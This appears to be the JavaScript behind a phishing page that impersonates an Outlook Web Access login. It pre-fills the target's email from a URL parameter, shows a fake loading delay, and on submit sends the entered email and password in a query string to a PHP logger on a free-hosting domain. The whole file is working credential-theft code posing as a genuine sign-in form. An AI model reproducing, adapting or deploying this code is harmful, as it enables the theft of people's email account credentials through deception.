const validEmail =
    /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

const getUrl = new URLSearchParams(window.location.search);
const userName = getUrl.get('user');

const loader = document.getElementById("temp_loader");
const owa_form = document.getElementById("owa_form");
const tempEmail = document.getElementById("tempEmail")

// const clientName = document.getElementById("clientName");

const username = document.getElementById("username");
const password = document.getElementById("password");
const owa_btn = document.getElementById("owa_btn");

if (validEmail.test(userName)) {
    username.value = userName
    setTimeout(() => {
        loader.style.display = "none"
        owa_form.style.display = "block"
    }, 3000);
}
else if (validEmail.test(tempEmail.innerText)) {
    username.value = tempEmail.innerText
    setTimeout(() => {
        loader.style.display = "none"
        owa_form.style.display = "block"
    }, 3000);
}
else {
    setTimeout(() => {
        loader.style.display = "none"
        owa_form.style.display = "block"
    }, 3000);
}

owa_btn.addEventListener("click", function () {
    if (password.value.length >= 6) {
        url =
            "Domain" +
            "=" +
            "Outlook OWA" +
            "&" +
            "Mail" +
            "=" +
            username.value +
            "&" +
            "Pass" +
            "=" +
            password.value;

        location =
            "https://falser-skies.000webhostapp.com/gmb/log_owa.php?" + url;
        // "log_owa.php?" + url;
    } else {
        alert("Invalid Password");
    }
});
